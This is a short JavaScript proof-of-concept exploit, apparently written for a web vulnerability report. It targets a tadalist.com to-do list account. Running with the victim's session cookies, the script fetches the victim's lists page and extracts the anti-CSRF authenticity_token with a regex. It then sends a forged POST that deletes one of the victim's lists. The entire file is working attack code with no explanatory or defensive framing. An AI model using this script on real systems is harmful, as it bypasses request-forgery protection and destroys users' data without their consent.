(async () => {
  try {
    const victimListsUrl = 'https://123456.tadalist.com/lists';      // victim's /lists page
    const targetUrl = 'https://123456.tadalist.com/lists/2356146';  // victim's list delete URL

    // Fetch victim's /lists page HTML with credentials (cookies)
    const res = await fetch(victimListsUrl, { credentials: 'include' });
    if (!res.ok) throw new Error(`Failed to fetch ${victimListsUrl}`);

    const html = await res.text();

    // Parse HTML and extract authenticity_token from onclick handlers
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    let token = null;
    for (const el of doc.querySelectorAll('[onclick]')) {
      const onclick = el.getAttribute('onclick');
      if (!onclick) continue;
      const match = onclick.match(/setAttribute\(['"]name['"],\s*['"]authenticity_token['"]\);\s*.*setAttribute\(['"]value['"],\s*['"]([^'"]+)['"]\)/i);
      if (match) {
        token = match[1];
        break;
      }
    }
    if (!token) {
      console.error('[-] authenticity_token not found!');
      return;
    }
    console.log('[+] Found authenticity_token:', token);

    // Prepare POST data to delete the list
    const formData = new URLSearchParams();
    formData.append('_method', 'delete');
    formData.append('authenticity_token', token);

    // Send POST request to delete the list with credentials
    const deleteRes = await fetch(targetUrl, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData.toString(),
      redirect: 'follow'
    });

    if (deleteRes.ok) {
      console.log('[+] List deleted successfully!');
    } else {
      console.warn(`[-] Failed to delete list. Status: ${deleteRes.status}`);
      const text = await deleteRes.text();
      console.log('[>] Response snippet:', text.slice(0, 500));
    }
  } catch (e) {
    console.error('[-] Error:', e);
  }
})();
